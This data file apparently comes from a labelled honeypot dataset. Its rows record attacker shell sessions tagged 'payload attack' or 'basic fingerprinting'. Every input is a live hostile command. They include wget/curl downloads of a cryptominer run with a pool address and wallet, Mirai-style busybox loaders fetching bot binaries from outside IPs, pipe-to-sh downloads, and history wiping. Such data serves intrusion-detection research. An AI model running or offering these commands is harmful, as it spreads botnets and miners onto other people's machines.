Unnamed: 0;session;duration;command_freq;input;attack_cat;label_nr;label_desc
17992;bd31661e152d;1,98512E+15;1;"cd /tmp ; mkdir .x ; cd .x ; wget http://20.106.163.35/cnrig ; curl -O http://20.106.163.35/cnrig ; chmod +x cnrig ; mv cnrig systemd ; ./systemd -o 37.187.95.110:443 -u 8ALdP9yTXenfNjgpm5TrRf7TGoBr8aUKU3kQcu7CLzfVJZYMXTohVb85GrRu7dy8PsTYrcisdG9LdMTmkuPRdZN7CnFsVWB -k --tls -p MinerCox -B ; echo DONE";Malicious activity;2;payload attack
19998;be77cdf33629;2,0256E+15;1;"cd /tmp ; mkdir .x ; cd .x ; wget http://20.106.163.35/cnrig ; curl -O http://20.106.163.35/cnrig ; chmod +x cnrig ; mv cnrig systemd ; ./systemd -o 37.187.95.110:443 -u 8ALdP9yTXenfNjgpm5TrRf7TGoBr8aUKU3kQcu7CLzfVJZYMXTohVb85GrRu7dy8PsTYrcisdG9LdMTmkuPRdZN7CnFsVWB -k --tls -p MinerCox -B ; echo DONE";Malicious activity;2;payload attack
20000;04851bacc40a;2,04252E+15;1;"cd /tmp ; mkdir .x ; cd .x ; wget http://20.106.163.35/cnrig ; curl -O http://20.106.163.35/cnrig ; chmod +x cnrig ; mv cnrig systemd ; ./systemd -o 37.187.95.110:443 -u 8ALdP9yTXenfNjgpm5TrRf7TGoBr8aUKU3kQcu7CLzfVJZYMXTohVb85GrRu7dy8PsTYrcisdG9LdMTmkuPRdZN7CnFsVWB -k --tls -p MinerCox -B ; echo DONE";Malicious activity;2;payload attack
21576;b865867bfc71;2,05148E+15;3;cd /tmp && chmod +x FiknqSBC && bash -c ./FiknqSBC;Malicious activity;3;basic fingerprinting
21577;b865867bfc71;2,05148E+15;3;./FiknqSBC;Malicious activity;3;basic fingerprinting
21578;b865867bfc71;2,05148E+15;3;./FiknqSBC;Malicious activity;3;basic fingerprinting
21989;5902dab3e330;2,10602E+15;23;">/tmp/.l && cd /tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
21990;5902dab3e330;2,10602E+15;23;">/run//var/.l && cd /run//var/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
21991;5902dab3e330;2,10602E+15;23;">/dev/.l && cd /dev/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
21992;5902dab3e330;2,10602E+15;23;">/mnt/.l && cd /mnt/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
21993;5902dab3e330;2,10602E+15;23;">/sys/fs/user/.l && cd /sys/fs/user/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
21994;5902dab3e330;2,10602E+15;23;">/usr/.l && cd /usr/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
21995;5902dab3e330;2,10602E+15;23;">/temp/.l && cd /temp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
21996;5902dab3e330;2,10602E+15;23;">/data/local/tmp/.l && cd /data/local/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
21997;5902dab3e330;2,10602E+15;23;">/local/.l && cd /local/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
21998;5902dab3e330;2,10602E+15;23;">/sys/.l && cd /sys/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
21999;5902dab3e330;2,10602E+15;23;">/etc/.l && cd /etc/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22000;5902dab3e330;2,10602E+15;23;">/media/.l && cd /media/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22001;5902dab3e330;2,10602E+15;23;">/www/.l && cd /www/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22002;5902dab3e330;2,10602E+15;23;">/var/tmp/.l && cd /var/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22003;5902dab3e330;2,10602E+15;23;">/dev/shm/.l && cd /dev/shm/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22004;5902dab3e330;2,10602E+15;23;">/dev/netslink/.l && cd /dev/netslink/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22005;5902dab3e330;2,10602E+15;23;">/boot/.l && cd /boot/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22006;5902dab3e330;2,10602E+15;23;"/bin/busybox wget || wget; /bin/busybox tftp || tftp; /bin/busybox ftpget || ftpget; echo -en '\x45\x43\x48\x4f\x5f\x44\x4f\x4e\x45'";Malicious activity;2;payload attack
22007;5902dab3e330;2,10602E+15;23;wget;Malicious activity;2;payload attack
22008;5902dab3e330;2,10602E+15;23;tftp;Malicious activity;2;payload attack
22009;5902dab3e330;2,10602E+15;23;ftpget;Malicious activity;2;payload attack
22010;5902dab3e330;2,10602E+15;23;"/bin/busybox wget http://185.243.56.167/bot_mips_eb -O- > .f; chmod 777 .f || (cp /proc/self/exe .m && > .m && cat .f > .m && (rm -rf .f || rm .f) && cp .m .f && (rm -rf .m || rm .f)); ./.f wget.mips; (rm -rf .f || rm .f); (rm -rf .m || rm .m)";Malicious activity;2;payload attack
22011;5902dab3e330;2,10602E+15;23;wget http://185.243.56.167/bot_mips_eb -O-;Malicious activity;2;payload attack
351;ce2d6c9a590a;2,10616E+15;26;shell;Malicious activity;2;payload attack
352;ce2d6c9a590a;2,10616E+15;26;shell;Malicious activity;2;payload attack
353;ce2d6c9a590a;2,10616E+15;26;sh;Malicious activity;2;payload attack
354;ce2d6c9a590a;2,10616E+15;26;">/tmp/.l && cd /tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
355;ce2d6c9a590a;2,10616E+15;26;">/run//var/.l && cd /run//var/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
356;ce2d6c9a590a;2,10616E+15;26;">/dev/.l && cd /dev/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
357;ce2d6c9a590a;2,10616E+15;26;">/mnt/.l && cd /mnt/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
358;ce2d6c9a590a;2,10616E+15;26;">/sys/fs/user/.l && cd /sys/fs/user/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
362;ce2d6c9a590a;2,10616E+15;26;">/usr/.l && cd /usr/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
364;ce2d6c9a590a;2,10616E+15;26;">/temp/.l && cd /temp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
365;ce2d6c9a590a;2,10616E+15;26;">/data/local/tmp/.l && cd /data/local/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
366;ce2d6c9a590a;2,10616E+15;26;">/local/.l && cd /local/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
367;ce2d6c9a590a;2,10616E+15;26;">/sys/.l && cd /sys/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
370;ce2d6c9a590a;2,10616E+15;26;">/etc/.l && cd /etc/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
373;ce2d6c9a590a;2,10616E+15;26;">/media/.l && cd /media/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
375;ce2d6c9a590a;2,10616E+15;26;">/www/.l && cd /www/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
377;ce2d6c9a590a;2,10616E+15;26;">/var/tmp/.l && cd /var/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
379;ce2d6c9a590a;2,10616E+15;26;">/dev/shm/.l && cd /dev/shm/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
381;ce2d6c9a590a;2,10616E+15;26;">/dev/netslink/.l && cd /dev/netslink/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
383;ce2d6c9a590a;2,10616E+15;26;">/boot/.l && cd /boot/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
384;ce2d6c9a590a;2,10616E+15;26;"/bin/busybox wget || wget; /bin/busybox tftp || tftp; /bin/busybox ftpget || ftpget; echo -en '\x45\x43\x48\x4f\x5f\x44\x4f\x4e\x45'";Malicious activity;2;payload attack
385;ce2d6c9a590a;2,10616E+15;26;wget;Malicious activity;2;payload attack
386;ce2d6c9a590a;2,10616E+15;26;tftp;Malicious activity;2;payload attack
387;ce2d6c9a590a;2,10616E+15;26;ftpget;Malicious activity;2;payload attack
389;ce2d6c9a590a;2,10616E+15;26;"/bin/busybox wget http://185.243.56.167/bot_x86_64_el -O- > .f; chmod 777 .f || (cp /proc/self/exe .m && > .m && cat .f > .m && (rm -rf .f || rm .f) && cp .m .f && (rm -rf .m || rm .f)); ./.f wget.x86_64; (rm -rf .f || rm .f); (rm -rf .m || rm .m)";Malicious activity;2;payload attack
390;ce2d6c9a590a;2,10616E+15;26;wget http://185.243.56.167/bot_x86_64_el -O-;Malicious activity;2;payload attack
317;1e57b6232ff2;2,11252E+15;26;shell;Malicious activity;2;payload attack
318;1e57b6232ff2;2,11252E+15;26;shell;Malicious activity;2;payload attack
319;1e57b6232ff2;2,11252E+15;26;sh;Malicious activity;2;payload attack
320;1e57b6232ff2;2,11252E+15;26;">/tmp/.l && cd /tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
321;1e57b6232ff2;2,11252E+15;26;">/run//var/.l && cd /run//var/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
322;1e57b6232ff2;2,11252E+15;26;">/dev/.l && cd /dev/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
323;1e57b6232ff2;2,11252E+15;26;">/mnt/.l && cd /mnt/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
324;1e57b6232ff2;2,11252E+15;26;">/sys/fs/user/.l && cd /sys/fs/user/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
328;1e57b6232ff2;2,11252E+15;26;">/usr/.l && cd /usr/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
330;1e57b6232ff2;2,11252E+15;26;">/temp/.l && cd /temp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
331;1e57b6232ff2;2,11252E+15;26;">/data/local/tmp/.l && cd /data/local/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
332;1e57b6232ff2;2,11252E+15;26;">/local/.l && cd /local/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
333;1e57b6232ff2;2,11252E+15;26;">/sys/.l && cd /sys/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
334;1e57b6232ff2;2,11252E+15;26;">/etc/.l && cd /etc/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
335;1e57b6232ff2;2,11252E+15;26;">/media/.l && cd /media/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
336;1e57b6232ff2;2,11252E+15;26;">/www/.l && cd /www/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
337;1e57b6232ff2;2,11252E+15;26;">/var/tmp/.l && cd /var/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
338;1e57b6232ff2;2,11252E+15;26;">/dev/shm/.l && cd /dev/shm/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
339;1e57b6232ff2;2,11252E+15;26;">/dev/netslink/.l && cd /dev/netslink/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
340;1e57b6232ff2;2,11252E+15;26;">/boot/.l && cd /boot/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
341;1e57b6232ff2;2,11252E+15;26;"/bin/busybox wget || wget; /bin/busybox tftp || tftp; /bin/busybox ftpget || ftpget; echo -en '\x45\x43\x48\x4f\x5f\x44\x4f\x4e\x45'";Malicious activity;2;payload attack
342;1e57b6232ff2;2,11252E+15;26;wget;Malicious activity;2;payload attack
343;1e57b6232ff2;2,11252E+15;26;tftp;Malicious activity;2;payload attack
344;1e57b6232ff2;2,11252E+15;26;ftpget;Malicious activity;2;payload attack
345;1e57b6232ff2;2,11252E+15;26;"/bin/busybox wget http://185.243.56.167/bot_ia_64_el -O- > .f; chmod 777 .f || (cp /proc/self/exe .m && > .m && cat .f > .m && (rm -rf .f || rm .f) && cp .m .f && (rm -rf .m || rm .f)); ./.f wget.ia_64; (rm -rf .f || rm .f); (rm -rf .m || rm .m)";Malicious activity;2;payload attack
346;1e57b6232ff2;2,11252E+15;26;wget http://185.243.56.167/bot_ia_64_el -O-;Malicious activity;2;payload attack
21666;881652e5d26d;2,16124E+15;1;"cat /etc/issue; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://179.43.187.99/cometome; cat cometome > rooted; chmod +x rooted; chmod 777 *; ./rooted; history -c";Malicious activity;2;payload attack
23710;37934d302c8c;2,18511E+15;3;cd /tmp && chmod +x dz8D71dJ && bash -c ./dz8D71dJ;Malicious activity;2;payload attack
23711;37934d302c8c;2,18511E+15;3;./dz8D71dJ;Malicious activity;2;payload attack
23712;37934d302c8c;2,18511E+15;3;./dz8D71dJ;Malicious activity;2;payload attack
23857;b768b276d9be;2,20763E+15;19;start;Malicious activity;2;payload attack
23858;b768b276d9be;2,20763E+15;19;start;Malicious activity;2;payload attack
23859;b768b276d9be;2,20763E+15;19;enable;Malicious activity;2;payload attack
23860;b768b276d9be;2,20763E+15;19;config terminal;Malicious activity;2;payload attack
23861;b768b276d9be;2,20763E+15;19;config terminal;Malicious activity;2;payload attack
23862;b768b276d9be;2,20763E+15;19;system;Malicious activity;2;payload attack
23863;b768b276d9be;2,20763E+15;19;system;Malicious activity;2;payload attack
23864;b768b276d9be;2,20763E+15;19;linuxshell;Malicious activity;2;payload attack
23865;b768b276d9be;2,20763E+15;19;linuxshell;Malicious activity;2;payload attack
23866;b768b276d9be;2,20763E+15;19;su;Malicious activity;2;payload attack
23867;b768b276d9be;2,20763E+15;19;shell;Malicious activity;2;payload attack
23868;b768b276d9be;2,20763E+15;19;shell;Malicious activity;2;payload attack
23869;b768b276d9be;2,20763E+15;19;sh;Malicious activity;2;payload attack
23870;b768b276d9be;2,20763E+15;19;"cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'";Malicious activity;2;payload attack
23871;b768b276d9be;2,20763E+15;19;echo -ne \x45\x4c\x46;Malicious activity;2;payload attack
23872;b768b276d9be;2,20763E+15;19;"/bin/busybox wget;/bin/busybox echo -ne '\x45\x4c\x46'";Malicious activity;2;payload attack
23873;b768b276d9be;2,20763E+15;19;wget;Malicious activity;2;payload attack
23874;b768b276d9be;2,20763E+15;19;echo -ne \x45\x4c\x46;Malicious activity;2;payload attack
23875;b768b276d9be;2,20763E+15;19;"cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O http://192.168.1.1:8088/i; /bin/busybox wget http://192.168.1.1:8088/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'";Malicious activity;2;payload attack
22768;5a54a16fc3ce;2,20865E+15;19;start;Malicious activity;2;payload attack
22769;5a54a16fc3ce;2,20865E+15;19;start;Malicious activity;2;payload attack
22770;5a54a16fc3ce;2,20865E+15;19;enable;Malicious activity;2;payload attack
22771;5a54a16fc3ce;2,20865E+15;19;config terminal;Malicious activity;2;payload attack
22772;5a54a16fc3ce;2,20865E+15;19;config terminal;Malicious activity;2;payload attack
22773;5a54a16fc3ce;2,20865E+15;19;system;Malicious activity;2;payload attack
22774;5a54a16fc3ce;2,20865E+15;19;system;Malicious activity;2;payload attack
22775;5a54a16fc3ce;2,20865E+15;19;linuxshell;Malicious activity;2;payload attack
22776;5a54a16fc3ce;2,20865E+15;19;linuxshell;Malicious activity;2;payload attack
22777;5a54a16fc3ce;2,20865E+15;19;su;Malicious activity;2;payload attack
22778;5a54a16fc3ce;2,20865E+15;19;shell;Malicious activity;2;payload attack
22779;5a54a16fc3ce;2,20865E+15;19;shell;Malicious activity;2;payload attack
22780;5a54a16fc3ce;2,20865E+15;19;sh;Malicious activity;2;payload attack
22781;5a54a16fc3ce;2,20865E+15;19;"cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'";Malicious activity;2;payload attack
22782;5a54a16fc3ce;2,20865E+15;19;echo -ne \x45\x4c\x46;Malicious activity;2;payload attack
22783;5a54a16fc3ce;2,20865E+15;19;"/bin/busybox wget;/bin/busybox echo -ne '\x45\x4c\x46'";Malicious activity;2;payload attack
22784;5a54a16fc3ce;2,20865E+15;19;wget;Malicious activity;2;payload attack
22785;5a54a16fc3ce;2,20865E+15;19;echo -ne \x45\x4c\x46;Malicious activity;2;payload attack
22786;5a54a16fc3ce;2,20865E+15;19;"cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O http://192.168.1.1:8088/i; /bin/busybox wget http://192.168.1.1:8088/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'";Malicious activity;2;payload attack
12695;8e9187b8b867;2,23466E+15;6;wget -qO - http://61.177.137.133/x/1sh | sh > /dev/null 2>&1 &;Malicious activity;2;payload attack
12696;8e9187b8b867;2,23466E+15;6;"rm -rf /var/run/1sh; wget -c http://61.177.137.133/x/1sh -P /var/run && sh /var/run/1sh &";Malicious activity;2;payload attack
12697;8e9187b8b867;2,23466E+15;6;wget -qO - http://61.177.137.133/x/2sh | sh > /dev/null 2>&1 &;Malicious activity;2;payload attack
12698;8e9187b8b867;2,23466E+15;6;"rm -rf /tmp/2sh; wget -c http://61.177.137.133/x/2sh -P /tmp && sh /tmp/2sh &";Malicious activity;2;payload attack
12699;8e9187b8b867;2,23466E+15;6;curl http://61.177.137.133/x/3sh | sh;Malicious activity;2;payload attack
12700;8e9187b8b867;2,23466E+15;6;"cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &";Malicious activity;2;payload attack
23948;092bc98c7312;2,44464E+15;3;cd /tmp && chmod +x V3HnSuLj && bash -c ./V3HnSuLj;Malicious activity;3;basic fingerprinting
23949;092bc98c7312;2,44464E+15;3;./V3HnSuLj;Malicious activity;3;basic fingerprinting
23950;092bc98c7312;2,44464E+15;3;./V3HnSuLj;Malicious activity;3;basic fingerprinting
15927;443710f15704;2,44776E+15;3;cd /tmp && chmod +x KJzTn6Gq && bash -c ./KJzTn6Gq;Malicious activity;3;basic fingerprinting
15928;443710f15704;2,44776E+15;3;./KJzTn6Gq;Malicious activity;3;basic fingerprinting
15929;443710f15704;2,44776E+15;3;./KJzTn6Gq;Malicious activity;3;basic fingerprinting
16930;504fcbfa71d5;2,51577E+15;3;cd /tmp && chmod +x QaTqRs5B && bash -c ./QaTqRs5B;Malicious activity;3;basic fingerprinting
16931;504fcbfa71d5;2,51577E+15;3;./QaTqRs5B;Malicious activity;3;basic fingerprinting
16932;504fcbfa71d5;2,51577E+15;3;./QaTqRs5B;Malicious activity;3;basic fingerprinting
15930;49e46090b000;2,62176E+15;3;cd /tmp && chmod +x KJzTn6Gq && bash -c ./KJzTn6Gq;Malicious activity;3;basic fingerprinting
15931;49e46090b000;2,62176E+15;3;./KJzTn6Gq;Malicious activity;3;basic fingerprinting
15932;49e46090b000;2,62176E+15;3;./KJzTn6Gq;Malicious activity;3;basic fingerprinting
23102;acfbce2b02ad;2,62283E+15;3;cd /tmp && chmod +x aMqJioHu && bash -c ./aMqJioHu;Malicious activity;3;basic fingerprinting
23103;acfbce2b02ad;2,62283E+15;3;./aMqJioHu;Malicious activity;3;basic fingerprinting
23104;acfbce2b02ad;2,62283E+15;3;./aMqJioHu;Malicious activity;3;basic fingerprinting
17526;62a49dea352a;2,76594E+15;1;"cat /etc/issue; cd /tmp/; wget http://179.43.175.83/x86_64; chmod 777 x86_64; ./x86_64 x86xhed; history -c";Malicious activity;2;payload attack
18313;2bb51f2f2c25;2,79415E+15;3;cd /tmp && chmod +x mfUFqFa7 && bash -c ./mfUFqFa7;Malicious activity;2;payload attack
18314;2bb51f2f2c25;2,79415E+15;3;./mfUFqFa7;Malicious activity;2;payload attack
18315;2bb51f2f2c25;2,79415E+15;3;./mfUFqFa7;Malicious activity;2;payload attack
22185;1f457717f96e;2,83986E+15;26;shell;Malicious activity;2;payload attack
22186;1f457717f96e;2,83986E+15;26;shell;Malicious activity;2;payload attack
22187;1f457717f96e;2,83986E+15;26;sh;Malicious activity;2;payload attack
22188;1f457717f96e;2,83986E+15;26;">/tmp/.l && cd /tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22189;1f457717f96e;2,83986E+15;26;">/run//var/.l && cd /run//var/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22192;1f457717f96e;2,83986E+15;26;">/dev/.l && cd /dev/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22194;1f457717f96e;2,83986E+15;26;">/mnt/.l && cd /mnt/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22196;1f457717f96e;2,83986E+15;26;">/sys/fs/user/.l && cd /sys/fs/user/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22197;1f457717f96e;2,83986E+15;26;">/usr/.l && cd /usr/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22198;1f457717f96e;2,83986E+15;26;">/temp/.l && cd /temp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22199;1f457717f96e;2,83986E+15;26;">/data/local/tmp/.l && cd /data/local/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22200;1f457717f96e;2,83986E+15;26;">/local/.l && cd /local/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22201;1f457717f96e;2,83986E+15;26;">/sys/.l && cd /sys/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22202;1f457717f96e;2,83986E+15;26;">/etc/.l && cd /etc/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22203;1f457717f96e;2,83986E+15;26;">/media/.l && cd /media/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22204;1f457717f96e;2,83986E+15;26;">/www/.l && cd /www/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22205;1f457717f96e;2,83986E+15;26;">/var/tmp/.l && cd /var/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22206;1f457717f96e;2,83986E+15;26;">/dev/shm/.l && cd /dev/shm/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22207;1f457717f96e;2,83986E+15;26;">/dev/netslink/.l && cd /dev/netslink/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
22208;1f457717f96e;2,83986E+15;26;">/boot/.l && cd /boot/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T ";Malicious activity;2;payload attack
